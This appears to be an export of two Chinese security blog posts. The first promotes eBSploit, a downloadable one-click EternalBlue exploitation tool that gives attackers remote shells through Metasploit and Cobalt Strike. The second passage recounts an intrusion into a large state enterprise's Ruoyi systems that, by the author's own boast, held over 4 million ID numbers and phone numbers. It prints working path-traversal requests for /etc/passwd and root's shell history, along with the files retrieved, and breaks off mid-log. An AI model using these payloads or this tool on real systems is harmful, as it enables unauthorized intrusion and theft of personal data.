[{"title":"eBSploit 永恒之蓝一键利用工具","url":"/2024/08/18/20240818/","content":"![](http://cdn.anyiblog.top/product/ebsploit/cover/header.png)\nGithub项目： https://github.com/Anyyy111/eBSploit\n声明：本工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。\n\n## 介绍\n作者: Anyyy\n博客: https://www.anyiblog.top\t\n本文地址： https://www.anyiblog.top/2024/08/18/20240818\n\nB站演示视频：https://www.bilibili.com/video/BV1PTpfeXEgc/?spm_id_from=333.999.0.0\n\neBSploit适用于内网渗透中遇到MS17-010漏洞的情况快速上线公网msf及cs，同时支持自定义dll命令执行、会话迁移等操作。\n当前处于测试阶段，任何问题欢迎向我发送邮件：anyiguys@qq.com 或向我提交issue\n工具目前仅支持Windows系统。\n\n## 特点\n\n- 无需使用msfconsole，懒人操作一键打穿\n- 菜单式选项操作，易上手\n- 可自定义dll命令执行\n- 支持上线msf以及上线cs (msf迁移会话)\n- 通过生成dll版本的shellcode，利用攻击可在复杂的内网情况简单上线你的攻击服务器\n\n## 快速开始\n\n### 安装\nRelease中下载压缩包解压，命令行输入 eBSploit.exe 开始使用\n**环境要求：**\n1.需安装ruby 安装地址: https://github.com/oneclick/rubyinstaller2/releases/tag/RubyInstaller-3.0.4-1\nps: (程序由python编写，并用pyinstaller打包 无需安装其他第三方库 可快速使用)\n**以上操作完成后均需要添加至环境变量**\n\n### 配置\n配置文件位于项目目录下的 `config.yaml` 文件\n```yaml\ndll_file:\n  path: \nexploit_host:\n  arch: \n  ip: \n  port: \nlocal_host:\n  ip: \n  port: \nvps:\n  ip: \n  port: \n```\n---\n#### 字段\n**（带*号的为必填参数）**\n##### exploit_host\n**arch** 攻击目标的系统版本位数 可选: [x86, x64, x32] 默认(x64)\n***ip** 攻击目标的IP地址\n**port** 攻击目标的端口 默认(445)\n\n##### local_host\n***ip** msf攻击服务器的监听IP地址 \n***port** msf攻击服务器的监听端口\n\n##### vps （可选）\n**vps_ip** cs服务器的监听IP地址 \n**vps_port** cs服务器的监听端口\n\n##### dll_file \n***dll_file** dll文件的路径，该文件必须为shellcode代码，是永恒之蓝攻击加载的必要参数。\n\n#### 修改\n##### 直接编辑config.yaml\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/3NYAXlVR0fRdpIFJ1723952410.png)\n\n##### 程序自带的修改功能（推荐）\n**可以使用软件的编辑功能来修改字段内容：**\n运行程序，选择功能5：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/YNdDMlcuvHSwUoIW1723952410.png)\n\n此时可以直接编辑字段：\n\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/2KMQ1MXOgkFF9AYr1723952410.png)\n通过小键盘的方向键选择字段，回车编辑字段，再输入内容即可修改。\n\n`输入 t 切换字段  输入 s 保存内容  输入 q 退出`\n\nPS: 程序会自动复制字段的已有内容，直接ctrl+v可以直接粘贴内容\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/ktLiBbTqhTz3HrGH1723952410.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/aiqWlGI51duUzFrE1723952411.png)\n### 使用\n#### 操作原理\n使用工具前先了解操作原理，会更容易理解功能如何使用。\n\n1. 通过生成一个shellcode的dll文件，通过EternalBlue永恒之蓝种植后门后DoublePulsar双脉冲星调用（功能点1和4）\n\n2. 如果是反弹msf的情况就需要kali服务器使用msfconsole的`exploit/multi/handler`模块来监听，用于接收反弹shell（功能点2）\n   如果是反弹msf再反弹cs的情况，本质上是通过msf监听得到的shell利用模块`exploit/windows/local/payload_inject`进行迁移，这里需要cs服务器配置监听器（详细操作参考2.1.1中的配置截图）\n   **脚本会自动生成一份监听脚本，上传至服务器后python运行可自动监听和检测是否上线。**\n   \n   如果是自定义命令执行的情况则无需监听，直接跳转至 第三步进行攻击\n\n3. 以上准备工作做完以后，就可以开始攻击了（功能点3），运行完成后检测msfconsole是否反弹shell成功，以及cs是否迁移会话成功即可。\n\n#### 1. Shellcode生成\n这里的shellcode统一生成为dll文件，用于双脉充星DoublePulsar调用。\ndll文件保存于 `dlls`文件夹\n\n##### 1.1 上线msf的shellcode生成\n功能点1：\n(这里要用到msfvenom来生成，使用前需检查ruby是否安装成功)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/3XOOYwvGwnlBVyT61723952411.png)\n生成成功后，系统会自动指定dll_file字段为新生成dll的路径，同时会询问是否跳转至监听脚本生成，这个视情况选择。\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/p7gJBPQMlnFVBb8f1723952412.png)\n\n\n##### 1.2 任意命令shellcode生成\n功能点4：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/Ch4ReBDJRt6RoRZT1723952412.png)\n生成成功后，系统会自动指定dll_file字段为新生成dll的路径\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/p7gJBPQMlnFVBb8f1723952412.png)\n\n#### 2. msf监听脚本生成\nMS17-010反弹shell往往是反弹到msf的监听模块中，这里程序会根据你的参数设置自动生成一份msf监听调用脚本。\n\n##### 2.1 反弹Msfconsole再迁移至cs会话脚本\n功能点2：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/fRQocVSZFm6s1ZKx1723952413.png)\n\n使用前我们需要配置cs服务器\n###### 2.1.1 CS监听器配置\n打开监听器：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/TlKkPpwvMrPnPVyt1723952413.png)\n添加监听器：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/5DgT5HaAkL8yVygr1723952414.png)\n添加hosts:\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/vdgBoDayuEgd1hFF1723952414.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/Lqcf9HPAoE4uGto91723952415.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/HbQu0Ubl7wEUedIC1723952415.png)\n\n修改端口 添加名称 保存：![](http://cdn.anyiblog.top/product/ebsploit/imgs/wO7ToZrMc3t58bUq1723952415.png)\n\n监听器payload是这样的就说明配置成功了\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/jcKhrIB2MWRPIFdB1723952415.png)\n\n**（这里的IP和端口就是配置文件vps字段需要填写的部分）**\n\n配置完成后选择功能点1\n（未配置好参数系统会自动跳转）\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/QQcFBUWjy7i2Z1X11723952416.png)\n配置完毕后会生成msf的脚本（系统会自动复制脚本，直接cv粘贴到kali）：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/BdTcFEWpoZ3AtL6F1723952416.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/xxk0O8V9DxQuW8MC1723952416.png)\n然后复制到kali攻击服务器后python3运行即可进行监听。\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/1I4ZR7mEGW97RGGf1723952416.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/IjSaEC1blfPVVD1e1723952418.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/4FUHpeVjVClwv3kS1723952419.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/dGF89XNDNgFRAtOm1723952420.png)\n##### 2.2 反弹Msfconsole脚本\n功能点2：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/fRQocVSZFm6s1ZKx1723952413.png)\n\n选择功能点2\n（未配置好参数系统会自动跳转）\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/QQcFBUWjy7i2Z1X11723952416.png)\n配置完毕后会生成msf的脚本（系统会自动复制脚本，直接cv粘贴到kali）：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/SprSobwS1koXZugP1723952422.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/yCJSUWf88bSNR2VO1723952422.png)\n然后复制到kali攻击服务器后python3运行即可进行监听。\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/3mov0KbC0TqBob411723952423.png)\n\n#### 3. EternalBlue攻击\n反弹shellcode的dll生成后以及服务器开始监听后，就可以开始攻击了。\n原理是先用EternalBlue种植后门，再用Doublepulsar利用后门调用恶意dll，实现代码执行。\n**如果这台机子此前被永恒之蓝攻击过，且没有关机重启，可能会导致攻击失败。**\n功能点3:\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/fKc63D6DcwxOxpi31723952423.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/78A7OkfnI4HDF2m71723952425.png)\n\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/7mavfhQ52HpJUg6e1723952425.png)\n\n运行完后会在根目录生成payload.txt用于手工复现：\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/7QBug2i6Nsq8dvC91723952427.png)\n\n切换到目录 `exploit_eternalpulse/` 打开cmd输入命令即可重测。\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/JjVSipLr6Y5h4WCE1723952427.png)\n\n#### 4. 一键Getshell!\n结合了前面几个功能点，当参数配置完成后直接开始一把梭！\n\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/BCOcuxIpLeUdBSNQ1723952428.png)\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/h8yDdz98b6zgKhvH1723952429.png)![](http://cdn.anyiblog.top/product/ebsploit/imgs/5kaQBz250jZ5Rw7Y1723952432.png)\n\n### 需要Socks5代理的情况\n\n这里用proxifier代理应用，需要注意代理时需要代理所有的exe程序，因为调用了其他的exe。\n例如 `C:\\Users\\Administrator\\Desktop\\yanshi\\eBSploit\\*.exe` ：\n\n![](http://cdn.anyiblog.top/product/ebsploit/imgs/o7TQA2vvUMjUM5hC1723952434.png)\n\n\n\n## 演示视频\n\n\n\n<iframe src=\"//player.bilibili.com/player.html?isOutside=true&aid=112978913395206&bvid=BV1PTpfeXEgc&cid=500001653076500&p=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"></iframe>\n","tags":["干货","开发","渗透"],"categories":["开发","eBSploit"]},{"title":"案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~","url":"/2024/06/01/20240601/","content":"# 前言\n\n从一个注册接口到打穿内网再到找到大量敏感信息。记录一下这次曲折且幸运的测试\n\n目标是一家大型国企，打完发现里面有400w+身份证、手机号 \\[doge\\]\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/x4N7ucJAv52ePfOy1717179602.png)\n![](http://cdn.anyiblog.top/WriteUp/20240601/r5yB4dhS8mQwNIU41717179602.png)\n\n# 资产打点\n\n\n前期拿到主域通过搜集子域找到了一堆Ruoyi的系统:\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/UdNzdcOoJ7CGQOQj1717179603.png)\n\n\n随便找几个访问，发现是很经典低版本的Ruoyi，并且填上了账号密码admin admin123:\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/e979WEBzTcilMHF81717179603.png)\n\n\n但是密码登录失败\n![](http://cdn.anyiblog.top/WriteUp/20240601/ZZ3V4q9udOI4X50t1717179603.png)\n\n一般低版本Ruoyi系统都存在Shiro 默认key的漏洞，用检测工具可以打，但是这个系统改了key，通过爆破也找不到key\n![](http://cdn.anyiblog.top/WriteUp/20240601/xQquCG2jfjwsMHaG1717179603.png)\n\n这个时候就有点懵逼了，只好看下别的ruoyi系统会不会有洞。\n\n# 漏洞发现\n\n然后刚好测试到下面这个站：\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/hT4TnMylJ8qTQNwd1717179604.png)\n\n看了眼源码，发现了一段注册接口的注释，路由/register\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/OluzwnqpeRVtQDK01717179604.png)\n\n这个时候赶紧去访问，发现确实能注册用户！！\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/zvN0J7cqNBY8VpJi1717179604.png)\n![](http://cdn.anyiblog.top/WriteUp/20240601/BSETg31mCdWhBfA31717179605.png)\n\n（后续测试别的ruoyi系统发现只有我这个系统能注册用户，别的站能访问注册页面但是没有权限注册）\n\n这个时候就进入后台了，但是没有什么功能点\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/VuSOtRSrGTS6Bswy1717179605.png)\n\n但是因为有了Cookie，所以很多Ruoyi的历史漏洞都可以测试了（很多漏洞都需要后台Cookie才能测），所以这里就用工具测试了下有哪些漏洞。\n\n\n\n## 任意文件读取\n\n\n\n发现存在CNVD-2021-01931 任意文件读取漏洞  \n\n访问接口读取/etc/passwd\n\n```\n/common/download/resource?resource=/profile/../../../../../../../etc/passwd\n```\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/t12OmYesbny7vNOj1717179605.png)\n\n并且用户权限很高，/root/的目录所有文件都能读取，那么第一步肯定是看root的历史记录：\n\n```\n/common/download/resource?resource=/profile/../../../../../../../root/.bash_history\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/UhzxZopoTSlmdSjq1717179605.png)\n\n日志如下：\n\n```\n#1713754877\nln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n#1713754878\ndate\n#1713754897\nyum install -y kde-l10n-Chinese\n#1713754943\nyum reinstall -y glibc-common\n#1713754952\nlocaledef -c -f UTF-8 -i zh_CN zh_CN.UFT-8\n#1713754957\nlocale -a\n#1713755138\ncd data/software/\n#1713755139\nls\n#1713755146\ncp -rf /data/software/jdk1.8 /data\n#1713755150\ncp -rf /data/software/tomcat-8.5.100 /data\n#1713755155\ncd /data/\n#1713755155\nls\n#1713755168\ncd /usr/share/\n#1713755174\nmkdir fonts\n#1713755177\ncd fonts/\n#1713755184\nmkdir chinese\n#1713755187\ncd chinese/\n#1713755196\nmkdir TrueType\n#1713755197\nls\n#1713755201\ncd /data/\n#1713755207\ncp /data/software/MSYH.TTF /usr/share/fonts/chinese/TrueType\n#1713755211\ncp /data/software/MSYHBD.TTF /usr/share/fonts/chinese/TrueType\n#1713755222\ncd /usr/share/fonts/chinese/TrueType/\n#1713755222\nls\n#1713755225\ncd /data/\n#1713755231\nyum install mkfontscale\n#1713755238\nmkfontscale\n#1713755243\nmkfontdir\n#1713755249\nyum install fontconfig\n#1713755258\nfc-cache -fv\n#1713755265\nvi /etc/profile\n#1713755296\nsource /etc/profile\n#1713755301\ncd /data\n#1713755357\nchmod -R 777 jdk1.8/\n#1713755362\nchmod -R 777 tomcat-8.5.100/\n#1713755364\nls\n#1713755369\njava -version\n#1713755376\ntouch start.sh\n#1713755379\nls\n#1713755386\nchmod 777 start.sh\n#1713755391\nvi start.sh\n#1713755413\nexit\nls\ncd data/\nls\nexit\ncd /data/\nls\ncat /etc/profile\nls\ncat start.sh\nvi start.sh\nexit\n```\n\n\n\n## 思路（翻日志）\n\n其实没有给特别好的信息，但是好在我们知道了tomcat的绝对路径/data/tomcat-8.5.100/ 也知道了这个站是用tomcat搭的Ruoyi系统。\n\n扫过端口只有网页端口开放，且没有tomcat默认页(/manager/html用不了)，所以当时的思路就是通过找到ruoyi.jar包，再解包得到里面的配置信息，里面会记录shiro key值，最后我们再用Shiro来getshell。\n\n百度了下tomcat咋部署若依，发现其路径就是在tomcat/webapps的某个.war包\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/VniyDfmIinq5PSPQ1717179606.png)\n\n那么当下最要紧的事情就是找到tomcat的日志，找到这个包的包名。\n\ntomcat常见日志文件：\n\n```\n/logs/catalina.out\n/logs/catalina.Y-M-D.log\n/logs/manager.Y-M-D.log\n/logs/host-manager.Y-M-D.log\n/logs/localhost_access_log.Y-M-D.txt\n```\n\n\n当时我只测了logs/catalina.out，发现不存在！！\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/9zgO5B2G69zSsMwe1717179606.png)\n\n## 转折\n\n当时发现日志没有就在找别的办法，所以是有测试过这些其他的日志名+日期的，然后发现找不到直接挫败了，于是乎我就搜tomcat日志的配置文件，尝试找到其后缀，但是一套操作下来发现还是找不到。。\n\n后面我找到了/conf/service.xml，发现了这么一段内容：\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/UIQ14q3BaPLj4RQg1717179606.png)\n\n找到了localhost日志的后缀，因为当时还没想到fuzz 上面tomcat的日志名的思路嘛，然后看到这个直接就有想法了，构造了localhost\\_access\\_log.2024-05-24.txt，然后访问，我去真有！！\n\n![](http://cdn.anyiblog.top/WriteUp/20240601/hbTDKj3mOfvuSJfs1717179606.png)\n\n直接点燃信心了好吧，然后翻阅内容就是一些访问记录，有泄露内网IP和接口，没什么大用\n![](http://cdn.anyiblog.top/WriteUp/20240601/h99w9YR9fVqnHfaG1717179607.png)\n\n### 找到关键信息（劳大发力）\n\n（这里日期我随便填了个24，后面打进去我找logs文件夹下的日志文件，我发现我这随手一填的数字构造的日志名，是所有日志文件里唯一的一份！！太欧了。。劳大也在帮助我！！）\n![](http://cdn.anyiblog.top/WriteUp/20240601/xltWatCRvcG8Wukj1717179607.jpg)（MAN!)\n\n\n然后就有思路了呀，因为5月24日的日志有了，那肯定catalina.out也有，然后这个时候就找到了tomcat的常见日志名，逐个fuzz了一下 最终找到了文件：logs/catalina.2024-05-24.log\n\n这可是好东西呀，里面给了很多有用的信息\n\n```\n24-May-2024 14:16:02.717 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Server.服务器版本: Apache Tomcat/8.5.100\n24-May-2024 14:16:02.722 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 服务器构建:        Mar 19 2024 13:54:42 UTC\n24-May-2024 14:16:02.722 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 服务器版本号:      8.5.100.0\n24-May-2024 14:16:02.722 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 操作系统名称:      Linux\n24-May-2024 14:16:02.722 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log OS.版本:           4.18.0-477.10.1.el8_8.x86_64\n24-May-2024 14:16:02.722 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 架构:              amd64\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Java 环境变量:     /data/jdk1.8/jre\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Java虚拟机版本:    1.8.0_301-b09\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log JVM.供应商:        Oracle Corporation\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:     /data/tomcat-8.5.100\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:     /data/tomcat-8.5.100\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.util.logging.config.file=/data/tomcat-8.5.100/conf/logging.properties\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager\n24-May-2024 14:16:02.723 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djdk.tls.ephemeralDHKeySize=2048\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.protocol.handler.pkgs=org.apache.catalina.webresources\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dorg.apache.catalina.security.SecurityListener.UMASK=0027\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dignore.endorsed.dirs=\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dcatalina.base=/data/tomcat-8.5.100\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Dcatalina.home=/data/tomcat-8.5.100\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：       -Djava.io.tmpdir=/data/tomcat-8.5.100/temp\n24-May-2024 14:16:02.724 信息 [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent 在java.library.path:[/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]上找不到基于APR的Apache Tomcat本机库，该库允许在生产环境中获得最佳性能\n24-May-2024 14:16:02.949 信息 [main] org.apache.coyote.AbstractProtocol.init 初始化协议处理器 [\"http-nio-8080\"]\n24-May-2024 14:16:02.977 信息 [main] org.apache.catalina.startup.Catalina.load Initialization processed in 943 ms\n24-May-2024 14:16:03.027 信息 [main] org.apache.catalina.core.StandardService.startInternal 正在启动服务[Catalina]\n24-May-2024 14:16:03.027 信息 [main] org.apache.catalina.core.StandardEngine.startInternal 正在启动 Servlet 引擎：[Apache Tomcat/8.5.100]\n24-May-2024 14:16:03.066 信息 [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR 正在部署web应用程序存档文件[/data/tomcat-8.5.100/webapps/ROOT.war]\n24-May-2024 14:16:04.606 警告 [localhost-startStop-1] org.apache.tomcat.util.descriptor.web.WebXml.setVersion 未知版本字符串 [4.0]。将使用默认版本。\n24-May-2024 14:16:04.730 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/fonts/fontawesome-webfont.svg]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.731 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/fonts/fontawesome-webfont.eot]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.732 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/fonts/glyphicons-halflings-regular.eot]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.732 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/fonts/glyphicons-halflings-regular.svg]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.732 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/fonts/fontawesome-webfont.woff]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.733 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/delete.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.734 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/loading.gif]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.734 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/se-handle-dark.gif]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.734 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/shapemenu_highlight.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.735 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/bpmn-error.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.735 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/bpmn-warning.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.736 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/nw-handle-dark.gif]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.736 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/pencil.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.736 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/report_edit.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.737 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/images/wrench.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.737 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/remove-bendpoint-hover.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.738 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/grid.gif]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.738 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-align-horizontal-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.738 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-align-vertical.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.739 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-same-size-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.739 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-zoom-actual.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.739 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/kis_logo.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.740 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/add-bendpoint-hover.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.740 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-add-bendpoint-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.740 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-align-horizontal.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.741 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-remove-bendpoint-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.741 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-same-size.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.741 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 无法将位于[/WEB-INF/classes/static/modeler/editor-app/img-kis/icon-zoom-fit-selected.png]的资源添加到Web应用程序[]的缓存中，因为在清除过期缓存条目后可用空间仍不足 - 请考虑增加缓存的最大空间。\n24-May-2024 14:16:04.742 警告 [localhost-startStop-1] org.apache.catalina.webresources.Cache.getResource 